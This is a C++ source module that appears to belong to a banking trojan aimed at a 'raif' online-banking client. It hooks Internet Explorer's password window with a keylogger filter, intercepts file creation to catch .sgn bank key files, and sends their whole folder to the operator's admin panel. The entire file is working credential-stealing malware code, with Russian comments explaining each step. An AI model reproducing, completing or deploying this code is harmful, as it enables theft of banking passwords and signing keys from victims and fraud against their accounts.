#ifndef RafaH
	#error Exclude module from project
#endif



//****************************************************************************
#include <Windows.h>

#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "rafa.h"
#include "Config.h"
#include "FileGrabber.h"

#include "RafaDll.cpp"

#include "BotDebug.h"

namespace DBGRAFAKEY
{
	#include "DbgTemplates.h"
}

#define DBG DBGRAFAKEY::DBGOutMessage<>

namespace Rafa {

	//отсылает найденные файлы ключи в админку, сюда попадают файлы с расширением sgn, которые открываются
	//только после правильного ввода пароля
	//Отправляем полностью все содержимое папки в которой находится наш файл, и потом отключаем файл граббер
	int FileKeyEvent( FileGrabber::ParamEvent* e )
	{
		DBG( "Rafa", "Key file: '%s'", e->fileName );
		m_lstrcpy( e->nameSend, "skeys" );
		return FileGrabber::SENDFOLDER | FileGrabber::STOPRECEIVER;
	}
/*
	void AddFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel) {
		// Добавляем директорию в архив кейлогера
		KeyLogger::AddDirectory(FileName, Search->cFileName);

		Cancel = true;
		*(bool*)Data = true;
	}

	void SearchRafaFiles(PCHAR Drive, LPVOID Data, bool &Cancel) {
		char D = *Drive;
		if (D == 'a' || D == 'A' || D == 'b' || D == 'B')
			return;

		bool C = false;
		SearchFiles(Drive, "skeys*", false, FA_DIRECTORY, &C, AddFiles);
		Cancel = C;
	}
*/

#ifndef INT_MAX
	#define INT_MAX       2147483647
#endif


	void CopyRafaKeyFiles(LPVOID Sender)
	{
		DBG( "Rafa", "Активирована" );

#ifdef RafaDllModule
		InitHook_FilialRConDll();
#endif
		// Функция обработчик инициализации системы rafa
		// Добавляет в архив кейлогера файлы ключей
//		EnumDrives(DRIVE_REMOVABLE, SearchRafaFiles, NULL);

		FileGrabber::Init(FileGrabber::CREATEFILEA | FileGrabber::CREATEFILEW );
		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
		rv->FuncReceiver = FileKeyEvent;
		const DWORD neededExt[] = { 0x1CF3EE /* sgn */, 0 };
		FileGrabber::AddNeededExt( rv, neededExt );
		rv->minSize = INT_MAX; //игнорировать любые другие файлы кроме как по расширению
		FileGrabber::AddReceiver(rv);
	}

	void Init()
	{
		PKeyLogSystem S;
		S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
		if (S != NULL)
		{
			char RafaCaption[] = {
				'В', 'в', 'е', 'д', 'и', 'т', 'е', ' ', 'п', 'а', 'р', 'о', 'л', 'ь', 0 };

			char RafaClass[] = {'V','C','o','n','t','r','o','l','*', 0};

			S->OnActivate   = Rafa::CopyRafaKeyFiles;
			PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, RafaClass, (PCHAR)RafaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
		}
	}
}


//=============================================================================
//#endif  //RafaH



